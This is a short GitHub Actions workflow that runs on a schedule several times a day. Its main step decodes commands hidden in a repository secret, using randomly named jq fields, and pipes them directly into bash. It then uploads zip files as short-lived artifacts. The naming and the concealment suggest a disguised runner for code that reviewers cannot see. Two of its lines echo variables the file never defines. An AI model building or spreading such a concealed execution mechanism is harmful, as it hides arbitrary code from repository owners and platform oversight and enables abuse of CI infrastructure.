name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '23 2,8,14,20 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Start
        env:
          ra1: ${{ secrets.ra1 }}
        run: |
          printf '%s' "$ra1" | jq -r .yodgl61830 | /bin/bash
          echo $tzv72 | jq -r .joa39168 | /bin/bash
          echo $lj6 | jq -r .utg180 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: FCutnrri
          path: "*.zip"
          retention-days: 1
